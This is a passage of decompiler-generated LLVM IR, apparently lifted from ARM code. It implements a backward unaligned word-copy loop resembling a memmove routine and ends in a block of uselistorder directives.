  %v4_15720 = add i32 %v0_15720, -12
  %v5_15720 = inttoptr i32 %v4_15720 to i32*
  %v6_15720 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_15720, i32* %v5_15720, align 4
  %v7_15720 = add i32 %v0_15720, -8
  %v8_15720 = inttoptr i32 %v7_15720 to i32*
  %v9_15720 = load i32, i32* @ip, align 4
  store i32 %v9_15720, i32* %v8_15720, align 4
  %v10_15720 = add i32 %v0_15720, -4
  %v11_15720 = inttoptr i32 %v10_15720 to i32*
  %v12_15720 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15720, i32* %v11_15720, align 4
  store i32 %v1_15720, i32* %r0.global-to-local, align 4
  %v0_15724 = load i32, i32* %r2.global-to-local, align 4
  %v2_15724 = add i32 %v0_15724, -16
  store i32 %v2_15724, i32* %r2.global-to-local, align 4
  %v6_15728 = icmp slt i32 %v0_15724, 16
  br i1 %v6_15728, label %dec_label_pc_1572c, label %dec_label_pc_156fc.dec_label_pc_156fc_crit_edge

dec_label_pc_156fc.dec_label_pc_156fc_crit_edge:  ; preds = %dec_label_pc_156fc
  %v0_156fc.pre = load i32, i32* @r3, align 4
  %v0_15700.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_156fc

dec_label_pc_1572c:                               ; preds = %dec_label_pc_156fc
  %v2_1572c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1572c, i32* @r4, align 4
  %v5_1572c = load i8*, i8** %stack_var_-8, align 4
  %v6_1572c = ptrtoint i8* %v5_1572c to i32
  store i32 %v6_1572c, i32* @r5, align 4
  store i32 %v11_156f8, i32* @lr, align 4
  %v2_15730 = add i32 %v0_15724, -4
  store i32 %v2_15730, i32* %r2.global-to-local, align 4
  %v4_15730 = add i32 %v0_15724, 2147483632
  %v5_15730 = and i32 %v2_15730, %v4_15730
  %v6_15730 = icmp slt i32 %v5_15730, 0
  store i1 %v6_15730, i1* %cpsr_v.global-to-local, align 1
  %v7_15730 = icmp slt i32 %v2_15730, 0
  store i1 %v7_15730, i1* %cpsr_n.global-to-local, align 1
  %v8_15730 = icmp eq i32 %v2_15730, 0
  store i1 %v8_15730, i1* %cpsr_z.global-to-local, align 1
  %v5_15734 = icmp slt i32 %v2_15724, -12
  br i1 %v5_15734, label %dec_label_pc_15750, label %dec_label_pc_15738

dec_label_pc_15738:                               ; preds = %dec_label_pc_1572c, %dec_label_pc_156ec, %dec_label_pc_15738
  %v1_15744 = phi i32 [ %v5_15744, %dec_label_pc_15738 ], [ %v1_15720, %dec_label_pc_1572c ], [ %v0_1572019, %dec_label_pc_156ec ]
  %v0_15738 = load i32, i32* @r3, align 4
  %v3_15738 = mul i32 %v0_15738, 256
  store i32 %v3_15738, i32* %ip.global-to-local, align 4
  %v0_1573c = load i32, i32* %r1.global-to-local, align 4
  %v1_1573c = add i32 %v0_1573c, -4
  %v2_1573c = inttoptr i32 %v1_1573c to i32*
  %v3_1573c = load i32, i32* %v2_1573c, align 4
  store i32 %v3_1573c, i32* @r3, align 4
  store i32 %v1_1573c, i32* %r1.global-to-local, align 4
  %v4_15740 = udiv i32 %v3_1573c, 16777216
  %v5_15740 = or i32 %v4_15740, %v3_15738
  store i32 %v5_15740, i32* @ip, align 4
  %v2_15744 = add i32 %v1_15744, -4
  %v3_15744 = inttoptr i32 %v2_15744 to i32*
  store i32 %v5_15740, i32* %v3_15744, align 4
  %v4_15744 = load i32, i32* %r0.global-to-local, align 4
  %v5_15744 = add i32 %v4_15744, -4
  store i32 %v5_15744, i32* %r0.global-to-local, align 4
  %v0_15748 = load i32, i32* %r2.global-to-local, align 4
  %v2_15748 = add i32 %v0_15748, -4
  store i32 %v2_15748, i32* %r2.global-to-local, align 4
  %v6_1574c = icmp slt i32 %v0_15748, 4
  br i1 %v6_1574c, label %dec_label_pc_15750.loopexit, label %dec_label_pc_15738

dec_label_pc_15750.loopexit:                      ; preds = %dec_label_pc_15738
  %v4_15748 = sub i32 3, %v0_15748
  %v5_15748 = and i32 %v4_15748, %v0_15748
  %v6_15748 = icmp slt i32 %v5_15748, 0
  %v7_15748 = icmp slt i32 %v2_15748, 0
  store i1 %v6_15748, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15748, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_15750.loopexit, %dec_label_pc_1572c
  %v2_1569451 = phi i32 [ %v5_15744, %dec_label_pc_15750.loopexit ], [ %v1_15720, %dec_label_pc_1572c ]
  %v0_1568447 = phi i32 [ %v2_15748, %dec_label_pc_15750.loopexit ], [ %v2_15730, %dec_label_pc_1572c ]
  %v0_15750 = load i32, i32* %r1.global-to-local, align 4
  %v1_15750 = add i32 %v0_15750, 3
  store i32 %v1_15750, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_15758:                               ; preds = %dec_label_pc_156e8
  br i1 %v5_157c8, label %dec_label_pc_157a4, label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %dec_label_pc_15758
  store i32 %v2_157c4, i32* %r2.global-to-local, align 4
  %v3_15764 = load i32, i32* @r4, align 4
  store i32 %v3_15764, i32* %stack_var_-12, align 4
  %v6_15764 = load i32, i32* @r5, align 4
  %v8_15764 = inttoptr i32 %v6_15764 to i8*
  store i8* %v8_15764, i8** %stack_var_-8, align 4
  %v11_15764 = load i32, i32* @lr, align 4
  br label %dec_label_pc_15768

dec_label_pc_15768:                               ; preds = %dec_label_pc_15768.dec_label_pc_15768_crit_edge, %dec_label_pc_15760
  %v0_1578c = phi i32 [ %v1_1578c, %dec_label_pc_15768.dec_label_pc_15768_crit_edge ], [ %v0_1572019, %dec_label_pc_15760 ]
  %v0_1576c = phi i32 [ %v0_1576c.pre, %dec_label_pc_15768.dec_label_pc_15768_crit_edge ], [ %v1_156d8, %dec_label_pc_15760 ]
  %v0_15768 = phi i32 [ %v0_15768.pre, %dec_label_pc_15768.dec_label_pc_15768_crit_edge ], [ %v2_156dc, %dec_label_pc_15760 ]
  %v3_15768 = mul i32 %v0_15768, 65536
  store i32 %v3_15768, i32* %lr.global-to-local, align 4
  %v1_1576c = add i32 %v0_1576c, -4
  %v2_1576c = inttoptr i32 %v1_1576c to i32*
  %v3_1576c = load i32, i32* %v2_1576c, align 4
  store i32 %v3_1576c, i32* @r3, align 4
  %v4_1576c = add i32 %v0_1576c, -8
  %v5_1576c = inttoptr i32 %v4_1576c to i32*
  %v6_1576c = load i32, i32* %v5_1576c, align 4
  store i32 %v6_1576c, i32* %r4.global-to-local, align 4
  %v7_1576c = add i32 %v0_1576c, -12
  %v8_1576c = inttoptr i32 %v7_1576c to i32*
  %v9_1576c = load i32, i32* %v8_1576c, align 4
  store i32 %v9_1576c, i32* %r5.global-to-local, align 4
  %v10_1576c = add i32 %v0_1576c, -16
  %v11_1576c = inttoptr i32 %v10_1576c to i32*
  %v12_1576c = load i32, i32* %v11_1576c, align 4
  store i32 %v10_1576c, i32* %r1.global-to-local, align 4
  %v4_15770 = udiv i32 %v12_1576c, 65536
  %v5_15770 = or i32 %v4_15770, %v3_15768
  store i32 %v5_15770, i32* %lr.global-to-local, align 4
  %v3_15774 = mul i32 %v12_1576c, 65536
  %v4_15778 = udiv i32 %v9_1576c, 65536
  %v5_15778 = or i32 %v3_15774, %v4_15778
  store i32 %v5_15778, i32* @ip, align 4
  %v3_1577c = mul i32 %v9_1576c, 65536
  %v4_15780 = udiv i32 %v6_1576c, 65536
  %v5_15780 = or i32 %v3_1577c, %v4_15780
  store i32 %v5_15780, i32* %r5.global-to-local, align 4
  %v3_15784 = mul i32 %v6_1576c, 65536
  %v4_15788 = udiv i32 %v3_1576c, 65536
  %v5_15788 = or i32 %v3_15784, %v4_15788
  store i32 %v5_15788, i32* %r4.global-to-local, align 4
  %v1_1578c = add i32 %v0_1578c, -16
  %v2_1578c = inttoptr i32 %v1_1578c to i32*
  store i32 %v5_15788, i32* %v2_1578c, align 4
  %v4_1578c = add i32 %v0_1578c, -12
  %v5_1578c = inttoptr i32 %v4_1578c to i32*
  %v6_1578c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_1578c, i32* %v5_1578c, align 4
  %v7_1578c = add i32 %v0_1578c, -8
  %v8_1578c = inttoptr i32 %v7_1578c to i32*
  %v9_1578c = load i32, i32* @ip, align 4
  store i32 %v9_1578c, i32* %v8_1578c, align 4
  %v10_1578c = add i32 %v0_1578c, -4
  %v11_1578c = inttoptr i32 %v10_1578c to i32*
  %v12_1578c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1578c, i32* %v11_1578c, align 4
  store i32 %v1_1578c, i32* %r0.global-to-local, align 4
  %v0_15790 = load i32, i32* %r2.global-to-local, align 4
  %v2_15790 = add i32 %v0_15790, -16
  store i32 %v2_15790, i32* %r2.global-to-local, align 4
  %v6_15794 = icmp slt i32 %v0_15790, 16
  br i1 %v6_15794, label %dec_label_pc_15798, label %dec_label_pc_15768.dec_label_pc_15768_crit_edge

dec_label_pc_15768.dec_label_pc_15768_crit_edge:  ; preds = %dec_label_pc_15768
  %v0_15768.pre = load i32, i32* @r3, align 4
  %v0_1576c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15768

dec_label_pc_15798:                               ; preds = %dec_label_pc_15768
  %v2_15798 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15798, i32* @r4, align 4
  %v5_15798 = load i8*, i8** %stack_var_-8, align 4
  %v6_15798 = ptrtoint i8* %v5_15798 to i32
  store i32 %v6_15798, i32* @r5, align 4
  store i32 %v11_15764, i32* @lr, align 4
  %v2_1579c = add i32 %v0_15790, -4
  store i32 %v2_1579c, i32* %r2.global-to-local, align 4
  %v4_1579c = add i32 %v0_15790, 2147483632
  %v5_1579c = and i32 %v2_1579c, %v4_1579c
  %v6_1579c = icmp slt i32 %v5_1579c, 0
  store i1 %v6_1579c, i1* %cpsr_v.global-to-local, align 1
  %v7_1579c = icmp slt i32 %v2_1579c, 0
  store i1 %v7_1579c, i1* %cpsr_n.global-to-local, align 1
  %v8_1579c = icmp eq i32 %v2_1579c, 0
  store i1 %v8_1579c, i1* %cpsr_z.global-to-local, align 1
  %v5_157a0 = icmp slt i32 %v2_15790, -12
  br i1 %v5_157a0, label %dec_label_pc_157bc, label %dec_label_pc_157a4

dec_label_pc_157a4:                               ; preds = %dec_label_pc_15798, %dec_label_pc_15758, %dec_label_pc_157a4
  %v1_157b0 = phi i32 [ %v5_157b0, %dec_label_pc_157a4 ], [ %v1_1578c, %dec_label_pc_15798 ], [ %v0_1572019, %dec_label_pc_15758 ]
  %v0_157a4 = load i32, i32* @r3, align 4
  %v3_157a4 = mul i32 %v0_157a4, 65536
  store i32 %v3_157a4, i32* %ip.global-to-local, align 4
  %v0_157a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_157a8 = add i32 %v0_157a8, -4
  %v2_157a8 = inttoptr i32 %v1_157a8 to i32*
  %v3_157a8 = load i32, i32* %v2_157a8, align 4
  store i32 %v3_157a8, i32* @r3, align 4
  store i32 %v1_157a8, i32* %r1.global-to-local, align 4
  %v4_157ac = udiv i32 %v3_157a8, 65536
  %v5_157ac = or i32 %v4_157ac, %v3_157a4
  store i32 %v5_157ac, i32* @ip, align 4
  %v2_157b0 = add i32 %v1_157b0, -4
  %v3_157b0 = inttoptr i32 %v2_157b0 to i32*
  store i32 %v5_157ac, i32* %v3_157b0, align 4
  %v4_157b0 = load i32, i32* %r0.global-to-local, align 4
  %v5_157b0 = add i32 %v4_157b0, -4
  store i32 %v5_157b0, i32* %r0.global-to-local, align 4
  %v0_157b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_157b4 = add i32 %v0_157b4, -4
  store i32 %v2_157b4, i32* %r2.global-to-local, align 4
  %v6_157b8 = icmp slt i32 %v0_157b4, 4
  br i1 %v6_157b8, label %dec_label_pc_157bc.loopexit, label %dec_label_pc_157a4

dec_label_pc_157bc.loopexit:                      ; preds = %dec_label_pc_157a4
  %v4_157b4 = sub i32 3, %v0_157b4
  %v5_157b4 = and i32 %v4_157b4, %v0_157b4
  %v6_157b4 = icmp slt i32 %v5_157b4, 0
  %v7_157b4 = icmp slt i32 %v2_157b4, 0
  store i1 %v6_157b4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_157b4, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_157bc

dec_label_pc_157bc:                               ; preds = %dec_label_pc_157bc.loopexit, %dec_label_pc_15798
  %v2_1569452 = phi i32 [ %v5_157b0, %dec_label_pc_157bc.loopexit ], [ %v1_1578c, %dec_label_pc_15798 ]
  %v0_1568448 = phi i32 [ %v2_157b4, %dec_label_pc_157bc.loopexit ], [ %v2_1579c, %dec_label_pc_15798 ]
  %v0_157bc = load i32, i32* %r1.global-to-local, align 4
  %v1_157bc = add i32 %v0_157bc, 2
  store i32 %v1_157bc, i32* %r1.global-to-local, align 4
  br label %bb150

dec_label_pc_157c4:                               ; preds = %dec_label_pc_156d8
  br i1 %v5_157c8, label %dec_label_pc_15810, label %dec_label_pc_157cc

dec_label_pc_157cc:                               ; preds = %dec_label_pc_157c4
  store i32 %v2_157c4, i32* %r2.global-to-local, align 4
  %v3_157d0 = load i32, i32* @r4, align 4
  store i32 %v3_157d0, i32* %stack_var_-12, align 4
  %v6_157d0 = load i32, i32* @r5, align 4
  %v8_157d0 = inttoptr i32 %v6_157d0 to i8*
  store i8* %v8_157d0, i8** %stack_var_-8, align 4
  %v11_157d0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_157d4

dec_label_pc_157d4:                               ; preds = %dec_label_pc_157d4.dec_label_pc_157d4_crit_edge, %dec_label_pc_157cc
  %v0_157f8 = phi i32 [ %v1_157f8, %dec_label_pc_157d4.dec_label_pc_157d4_crit_edge ], [ %v0_1572019, %dec_label_pc_157cc ]
  %v0_157d8 = phi i32 [ %v0_157d8.pre, %dec_label_pc_157d4.dec_label_pc_157d4_crit_edge ], [ %v1_156d8, %dec_label_pc_157cc ]
  %v0_157d4 = phi i32 [ %v0_157d4.pre, %dec_label_pc_157d4.dec_label_pc_157d4_crit_edge ], [ %v2_156dc, %dec_label_pc_157cc ]
  %v3_157d4 = mul i32 %v0_157d4, 16777216
  store i32 %v3_157d4, i32* %lr.global-to-local, align 4
  %v1_157d8 = add i32 %v0_157d8, -4
  %v2_157d8 = inttoptr i32 %v1_157d8 to i32*
  %v3_157d8 = load i32, i32* %v2_157d8, align 4
  store i32 %v3_157d8, i32* @r3, align 4
  %v4_157d8 = add i32 %v0_157d8, -8
  %v5_157d8 = inttoptr i32 %v4_157d8 to i32*
  %v6_157d8 = load i32, i32* %v5_157d8, align 4
  store i32 %v6_157d8, i32* %r4.global-to-local, align 4
  %v7_157d8 = add i32 %v0_157d8, -12
  %v8_157d8 = inttoptr i32 %v7_157d8 to i32*
  %v9_157d8 = load i32, i32* %v8_157d8, align 4
  store i32 %v9_157d8, i32* %r5.global-to-local, align 4
  %v10_157d8 = add i32 %v0_157d8, -16
  %v11_157d8 = inttoptr i32 %v10_157d8 to i32*
  %v12_157d8 = load i32, i32* %v11_157d8, align 4
  store i32 %v10_157d8, i32* %r1.global-to-local, align 4
  %v4_157dc = udiv i32 %v12_157d8, 256
  %v5_157dc = or i32 %v4_157dc, %v3_157d4
  store i32 %v5_157dc, i32* %lr.global-to-local, align 4
  %v3_157e0 = mul i32 %v12_157d8, 16777216
  %v4_157e4 = udiv i32 %v9_157d8, 256
  %v5_157e4 = or i32 %v3_157e0, %v4_157e4
  store i32 %v5_157e4, i32* @ip, align 4
  %v3_157e8 = mul i32 %v9_157d8, 16777216
  %v4_157ec = udiv i32 %v6_157d8, 256
  %v5_157ec = or i32 %v3_157e8, %v4_157ec
  store i32 %v5_157ec, i32* %r5.global-to-local, align 4
  %v3_157f0 = mul i32 %v6_157d8, 16777216
  %v4_157f4 = udiv i32 %v3_157d8, 256
  %v5_157f4 = or i32 %v3_157f0, %v4_157f4
  store i32 %v5_157f4, i32* %r4.global-to-local, align 4
  %v1_157f8 = add i32 %v0_157f8, -16
  %v2_157f8 = inttoptr i32 %v1_157f8 to i32*
  store i32 %v5_157f4, i32* %v2_157f8, align 4
  %v4_157f8 = add i32 %v0_157f8, -12
  %v5_157f8 = inttoptr i32 %v4_157f8 to i32*
  %v6_157f8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_157f8, i32* %v5_157f8, align 4
  %v7_157f8 = add i32 %v0_157f8, -8
  %v8_157f8 = inttoptr i32 %v7_157f8 to i32*
  %v9_157f8 = load i32, i32* @ip, align 4
  store i32 %v9_157f8, i32* %v8_157f8, align 4
  %v10_157f8 = add i32 %v0_157f8, -4
  %v11_157f8 = inttoptr i32 %v10_157f8 to i32*
  %v12_157f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_157f8, i32* %v11_157f8, align 4
  store i32 %v1_157f8, i32* %r0.global-to-local, align 4
  %v0_157fc = load i32, i32* %r2.global-to-local, align 4
  %v2_157fc = add i32 %v0_157fc, -16
  store i32 %v2_157fc, i32* %r2.global-to-local, align 4
  %v6_15800 = icmp slt i32 %v0_157fc, 16
  br i1 %v6_15800, label %dec_label_pc_15804, label %dec_label_pc_157d4.dec_label_pc_157d4_crit_edge

dec_label_pc_157d4.dec_label_pc_157d4_crit_edge:  ; preds = %dec_label_pc_157d4
  %v0_157d4.pre = load i32, i32* @r3, align 4
  %v0_157d8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_157d4

dec_label_pc_15804:                               ; preds = %dec_label_pc_157d4
  %v2_15804 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_15804, i32* @r4, align 4
  %v5_15804 = load i8*, i8** %stack_var_-8, align 4
  %v6_15804 = ptrtoint i8* %v5_15804 to i32
  store i32 %v6_15804, i32* @r5, align 4
  store i32 %v11_157d0, i32* @lr, align 4
  %v2_15808 = add i32 %v0_157fc, -4
  store i32 %v2_15808, i32* %r2.global-to-local, align 4
  %v4_15808 = add i32 %v0_157fc, 2147483632
  %v5_15808 = and i32 %v2_15808, %v4_15808
  %v6_15808 = icmp slt i32 %v5_15808, 0
  store i1 %v6_15808, i1* %cpsr_v.global-to-local, align 1
  %v7_15808 = icmp slt i32 %v2_15808, 0
  store i1 %v7_15808, i1* %cpsr_n.global-to-local, align 1
  %v8_15808 = icmp eq i32 %v2_15808, 0
  store i1 %v8_15808, i1* %cpsr_z.global-to-local, align 1
  %v5_1580c = icmp slt i32 %v2_157fc, -12
  br i1 %v5_1580c, label %dec_label_pc_15828, label %dec_label_pc_15810

dec_label_pc_15810:                               ; preds = %dec_label_pc_15804, %dec_label_pc_157c4, %dec_label_pc_15810
  %v1_1581c = phi i32 [ %v5_1581c, %dec_label_pc_15810 ], [ %v1_157f8, %dec_label_pc_15804 ], [ %v0_1572019, %dec_label_pc_157c4 ]
  %v0_15810 = load i32, i32* @r3, align 4
  %v3_15810 = mul i32 %v0_15810, 16777216
  store i32 %v3_15810, i32* %ip.global-to-local, align 4
  %v0_15814 = load i32, i32* %r1.global-to-local, align 4
  %v1_15814 = add i32 %v0_15814, -4
  %v2_15814 = inttoptr i32 %v1_15814 to i32*
  %v3_15814 = load i32, i32* %v2_15814, align 4
  store i32 %v3_15814, i32* @r3, align 4
  store i32 %v1_15814, i32* %r1.global-to-local, align 4
  %v4_15818 = udiv i32 %v3_15814, 256
  %v5_15818 = or i32 %v4_15818, %v3_15810
  store i32 %v5_15818, i32* @ip, align 4
  %v2_1581c = add i32 %v1_1581c, -4
  %v3_1581c = inttoptr i32 %v2_1581c to i32*
  store i32 %v5_15818, i32* %v3_1581c, align 4
  %v4_1581c = load i32, i32* %r0.global-to-local, align 4
  %v5_1581c = add i32 %v4_1581c, -4
  store i32 %v5_1581c, i32* %r0.global-to-local, align 4
  %v0_15820 = load i32, i32* %r2.global-to-local, align 4
  %v2_15820 = add i32 %v0_15820, -4
  store i32 %v2_15820, i32* %r2.global-to-local, align 4
  %v6_15824 = icmp slt i32 %v0_15820, 4
  br i1 %v6_15824, label %dec_label_pc_15828.loopexit, label %dec_label_pc_15810

dec_label_pc_15828.loopexit:                      ; preds = %dec_label_pc_15810
  %v4_15820 = sub i32 3, %v0_15820
  %v5_15820 = and i32 %v4_15820, %v0_15820
  %v6_15820 = icmp slt i32 %v5_15820, 0
  %v7_15820 = icmp slt i32 %v2_15820, 0
  store i1 %v6_15820, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15820, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15828

dec_label_pc_15828:                               ; preds = %dec_label_pc_15828.loopexit, %dec_label_pc_15804
  %v2_1569453 = phi i32 [ %v5_1581c, %dec_label_pc_15828.loopexit ], [ %v1_157f8, %dec_label_pc_15804 ]
  %v0_1568449 = phi i32 [ %v2_15820, %dec_label_pc_15828.loopexit ], [ %v2_15808, %dec_label_pc_15804 ]
  %v0_15828 = load i32, i32* %r1.global-to-local, align 4
  %v1_15828 = add i32 %v0_15828, 1
  store i32 %v1_15828, i32* %r1.global-to-local, align 4
  br label %bb150

; uselistorder directives
  uselistorder i32 %v5_1581c, { 0, 2, 1 }
  uselistorder i32 %v3_15810, { 1, 0 }
  uselistorder i32 %v2_15808, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_157f8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_157d8, { 1, 0 }
  uselistorder i32 %v3_157d4, { 1, 0 }
  uselistorder i32 %v0_157d8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_157f8, { 3, 2, 1, 0 }
  uselistorder i32 %v5_157b0, { 0, 2, 1 }
  uselistorder i32 %v3_157a4, { 1, 0 }
  uselistorder i32 %v2_1579c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_1578c, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_1576c, { 1, 0 }
  uselistorder i32 %v3_15768, { 1, 0 }
  uselistorder i32 %v0_1576c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1578c, { 3, 2, 1, 0 }
  uselistorder i32 %v5_15744, { 0, 2, 1 }
  uselistorder i32 %v3_15738, { 1, 0 }
  uselistorder i32 %v2_15730, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15720, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v10_15700, { 1, 0 }
  uselistorder i32 %v3_156fc, { 1, 0 }
  uselistorder i32 %v0_15700, { 3, 2, 1, 0 }
  uselistorder i32 %v0_15720, { 3, 2, 1, 0 }
  uselistorder i1 %v5_157c8, { 2, 0, 1 }
  uselistorder i32 %v0_156e0, { 1, 0 }
  uselistorder i32 %v0_157cc, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_1572019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_156d0, { 2, 1, 0 }
  uselistorder i32 %v0_156d0, { 2, 0, 1 }
  uselistorder i32 %v2_156c8, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_156c8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_156c8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_1572020, { 2, 1, 0 }
  uselistorder i32 %v11_156a4, { 1, 0 }
  uselistorder i32 %v7_156a4, { 1, 0 }
  uselistorder i32 %v1_15684, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_15684, { 1, 2, 0, 3 }
  uselistorder i32 %v2_15688, { 1, 0 }
  uselistorder i32 %v7_1567c, { 0, 2, 1 }
  uselistorder i32 %v10_15678, { 1, 0 }
  uselistorder i32 %v9_15670, { 1, 0, 2 }
  uselistorder i32 %v6_1566c, { 1, 0 }
  uselistorder i32 %v2_15664, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_15664, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_15674, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15658, { 0, 2, 1 }
  uselistorder i32 %v13_15654, { 1, 0 }
  uselistorder i32 %v4_15650, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_15650, { 2, 0, 1 }
  uselistorder i32 %v6_15658, { 0, 3, 2, 1 }
  uselistorder i32 %v7_15648, { 0, 2, 1 }
  uselistorder i32 %v16_15644, { 1, 0 }
  uselistorder i32 %v4_15640, { 1, 2, 0 }
  uselistorder i32 %v0_15650.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_15648, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15634, { 0, 3, 2, 1 }
  uselistorder i32 %v10_15630, { 1, 0 }
  uselistorder i32 %v1_1562c, { 1, 0 }
  uselistorder i32 %v10_15628, { 1, 0 }
  uselistorder i32 %v0_15628, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1562c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_15620, { 0, 2, 1 }
  uselistorder i32 %v2_15614, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_15614, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_1562c37, { 1, 2, 0 }
  uselistorder i32 %v1_1560c, { 2, 1, 0 }
  uselistorder i32 %v1_15604, { 2, 3, 1, 0 }
  uselistorder i32 %v2_155fc, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_155f8, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_155f4, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_155f4, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_155e4, { 0, 2, 1 }
  uselistorder i32 %v4_155e0, { 1, 0 }
  uselistorder i32 %v3_155d4, { 1, 0 }
  uselistorder i32 %v1_155cc, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_155c0, { 1, 0 }
  uselistorder i32 %v12_155bc, { 0, 2, 1 }
  uselistorder i32 %v8_1559c, { 1, 0, 2 }
  uselistorder i32 %v5_1559c, { 1, 0, 2 }
  uselistorder i32 %v2_1559c, { 1, 0, 2 }
  uselistorder i32 %v0_1559c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_155bc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_15578, { 0, 2, 1 }
  uselistorder i32 %v4_15574, { 1, 0 }
  uselistorder i32 %v3_15568, { 1, 0 }
  uselistorder i32 %v1_15560, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_15554, { 1, 0 }
  uselistorder i32 %v12_15550, { 0, 2, 1 }
  uselistorder i32 %v8_15530, { 1, 0, 2 }
  uselistorder i32 %v5_15530, { 1, 0, 2 }
  uselistorder i32 %v2_15530, { 1, 0, 2 }
  uselistorder i32 %v0_15530, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_15550, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1550c, { 0, 2, 1 }
  uselistorder i32 %v4_15508, { 1, 0 }
  uselistorder i32 %v3_154fc, { 1, 0 }
  uselistorder i32 %v1_154f4, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_154e8, { 1, 0 }
  uselistorder i32 %v12_154e4, { 0, 2, 1 }
  uselistorder i32 %v8_154c4, { 1, 0, 2 }
  uselistorder i32 %v5_154c4, { 1, 0, 2 }
  uselistorder i32 %v2_154c4, { 1, 0, 2 }
  uselistorder i32 %v0_154c4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_154e4, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_15520, { 0, 2, 1 }
  uselistorder i32 %v1_1551c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_154a0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_154a0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_15524, { 1, 0, 3, 2 }
  uselistorder i32 %v0_155bc76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_15494, { 1, 0 }
  uselistorder i32 %v0_15494, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1548c, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_1548c, { 1, 0, 2 }
  uselistorder i32 %v0_1548c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_155bc77, { 1, 0 }
  uselistorder i32 %v1_1546c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_15474, { 1, 0 }
  uselistorder i32 %v0_15448, { 3, 0, 1, 2 }
  uselistorder i32 %v1_1543c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_15428, { 1, 0, 2 }
  uselistorder i32 %v1_15424, { 1, 0 }
  uselistorder i32 %v1_1541c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_1541c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_15414, { 0, 2, 1 }
  uselistorder i32 %v3_15414, { 3, 0, 1, 2 }
  uselistorder i1 %v0_15414, { 1, 0 }
  uselistorder i1 %v1_15414, { 1, 0 }
  uselistorder i32 %v3_15410, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_15408, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_153f4, { 1, 2, 0 }
  uselistorder i32 %v1_153ec, { 0, 2, 1 }
  uselistorder i32 %v12_153e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_153dc, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_153e0, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_153d0, { 0, 2, 1 }
  uselistorder i32 %v1_153c8, { 0, 1, 2, 4, 3 }
